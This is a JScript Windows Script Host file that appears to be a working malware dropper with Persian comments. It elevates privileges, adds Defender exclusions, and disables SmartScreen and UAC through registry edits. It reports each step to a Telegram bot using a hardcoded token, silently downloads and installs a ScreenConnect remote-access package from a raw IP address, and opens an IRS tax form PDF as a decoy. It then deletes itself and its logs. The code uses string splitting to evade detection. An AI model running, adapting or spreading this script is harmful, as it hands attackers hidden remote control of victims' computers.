// script.js - JScript (Windows Script Host)
// Requires: cscript.exe //nologo script.js

var a1 = WScript.CreateObject("WScript.Shell");
var a2 = WScript.CreateObject("Scripting.FileSystemObject");

var a3 = a1.ExpandEnvironmentStrings("%TEMP%");
var a4 = "C:\\ProgramData\\vbs_log.txt";
var a5 = "C:\\ProgramData\\f1040.pdf";
var a6 = "https://www.irs.gov/pub/irs-pdf/f1040.pdf";

var b1 = a1.ExpandEnvironmentStrings("%COMPUTERNAME%");

// ---------- توابع کمکی ----------
function L1(m1) {
    try {
        var x1 = a2.OpenTextFile(a4, 8, true); // ForAppending = 8
        x1.WriteLine("[" + new Date().toString() + "] " + m1);
        x1.Close();
    } catch (e) { /* ignore */ }
}

function L2(m2, e1) {
    var x2 = m2;
    if (e1 && e1.description) {
        x2 = x2 + " - Error: " + e1.description;
    }
    L1("ERROR: " + x2);
}

function ST(m3) {
    var t1 = "7976590771:AAGnFuurMl1DW3NLV6qKXzc_db-0JhMS0ys";
    var t2 = "1033582303";
    var t3 = "https://api.telegr" + "am.org/bot" + t1 + "/sendMe" + "ssage";
    var t4 = 'curl.exe -s -X POST "' + t3 + '" -d "chat_id=' + t2 + '&text=' + m3 + '"';
    a1.Run(t4, 0, true);
}

// ---------- بررسی دسترسی ادمین ----------
var c1 = false;
try {
    a1.RegWrite("HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\AdminTest", "1", "REG_SZ");
    c1 = true;
    a1.RegDelete("HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\AdminTest");
} catch (e) {
    c1 = false;
}

L1("=============================================");
L1("Script started");
ST("[" + b1 + "] Script started");

if (!c1) {
    L1("Requesting elevation...");
    ST("[" + b1 + "] Requesting elevation...");

    var d1 = WScript.CreateObject("Shell.Application");
    d1.ShellExecute("wscript.exe", '//nologo "' + WScript.ScriptFullName + '"', "", "runas", 1);
    WScript.Quit(0);
}

ST("[" + b1 + "] Running with administrator privileges");

// خواندن خودِ فایل برای نشانه‌گذاری (بی‌اثر)
a1.Run('cmd /c more < "' + WScript.ScriptFullName + '" > nul', 0, true);

// ---------- افزودن مسیرهای استثنا به Defender ----------
var e1 = "Add-MpPref" + "erence -Exclu" + "sionPath 'C:\\Prog" + "ramData\\'";
var e2 = "Add-MpPref" + "erence -Exclu" + "sionPath 'C:\\Wind" + "ows\\Temp\\'";
a1.Run('powers' + 'hell.exe -WindowStyle Hidden -Command "' + e1 + '"', 0, true);
a1.Run('powers' + 'hell.exe -WindowStyle Hidden -Command "' + e2 + '"', 0, true);

ST("[" + b1 + "] Disabling SmartScreen...");

// ---------- غیرفعال کردن SmartScreen ----------
var r1 = "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Wind" + "ows\\CurrentVersion\\Expl" + "orer";
var r2 = "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Wind" + "ows\\CurrentVersion\\AppH" + "ost";
var r3 = "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Wind" + "ows\\CurrentVersion\\AppH" + "ost";
var r4 = "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Wind" + "ows\\System";

a1.Run('reg add "' + r1 + '" /f', 0, true);
a1.Run('reg add "' + r1 + '" /v "Smar' + 'tScreenEn' + 'abled" /t REG_SZ /d "Off" /f', 0, true);
a1.Run('reg add "' + r2 + '" /f', 0, true);
a1.Run('reg add "' + r2 + '" /v "EnableWeb' + 'ContentEval' + 'uation" /t REG_DWORD /d 0 /f', 0, true);
a1.Run('reg add "' + r3 + '" /f', 0, true);
a1.Run('reg add "' + r3 + '" /v "EnableWeb' + 'ContentEval' + 'uation" /t REG_DWORD /d 0 /f', 0, true);
a1.Run('reg add "' + r4 + '" /f', 0, true);
a1.Run('reg add "' + r4 + '" /v "EnableSmart' + 'Screen" /t REG_DWORD /d 0 /f', 0, true);

// ---------- غیرفعال کردن UAC ----------
var r5 = "HKLM\\SOFTWARE\\Microsoft\\Wind" + "ows\\CurrentVersion\\Poli" + "cies\\System";
a1.Run('reg add "' + r5 + '" /v "Enab' + 'leLUA" /t REG_DWORD /d 0 /f', 0, true);

var r6 = null;
try { r6 = a1.RegRead(r5 + "\\Enab" + "leLUA"); } catch (e) { }
ST("[" + b1 + "] UAC disabled, value: " + r6);

// ---------- دانلود و نصب راه‌دور ----------
var f1 = "http://45.88.91.68/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest";

// اصلاح خطای 800A01B6 (استفاده از length به جای Count در JScript)
var args = WScript.Arguments;
for (var g1 = 0; g1 < args.length; g1++) {
    var g2 = args(g1);
    if (g2 !== "/elevate" && g2.indexOf("/") !== 0 && g2.indexOf("http") === 0) {
        f1 = g2;
        break;
    }
}

var f2 = "C:\\Wind" + "ows\\Temp\\Inst" + "aller.msi";
var f3 = "C:\\Wind" + "ows\\Temp\\down" + "load.ps1";

var f4 = 'curl.exe -L -k -o "' + f2 + '" "' + f1 + '" ' + "\r\n" +
         'curl.exe -L -k -o "' + a5 + '" "' + a6 + '"';

var f5 = a2.CreateTextFile(f3, true);
f5.Write(f4);
f5.Close();

a1.Run('powers' + 'hell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -File "' + f3 + '"', 0, true);

// ---------- باز کردن PDF ----------
if (a2.FileExists(a5)) {
    ST("[" + b1 + "] PDF opened");
    try { a2.GetFile(a5).Attributes = 2; } catch (e) { } // Hidden = 2
    a1.Run('cmd /c start "" "' + a5 + '"', 0, false);
    L1("PDF opened.");
}

// ---------- نصب MSI ----------
if (a2.FileExists(f2)) {
    ST("[" + b1 + "] MSI downloading and installing...");
    a1.Run('msie' + 'xec /i "' + f2 + '" /qn /norestart', 0, true);
    WScript.Sleep(3000);
    a2.DeleteFile(f2);
    ST("[" + b1 + "] Installation completed successfully");
} else {
    L1("MSI Download failed or file not found.");
}

if (a2.FileExists(f3)) a2.DeleteFile(f3);

ST("[" + b1 + "] Script completed");

WScript.Sleep(2000);

// ---------- پاک‌سازی آثار ----------
try { a2.DeleteFile(WScript.ScriptFullName); } catch (e) { }

if (a2.FileExists("C:\\Prog" + "ramData\\run.ps1")) {
    try { a2.DeleteFile("C:\\Prog" + "ramData\\run.ps1"); } catch (e) { }
}
if (a2.FileExists(a4)) {
    try { a2.DeleteFile(a4); } catch (e) { }
}

WScript.Quit(0);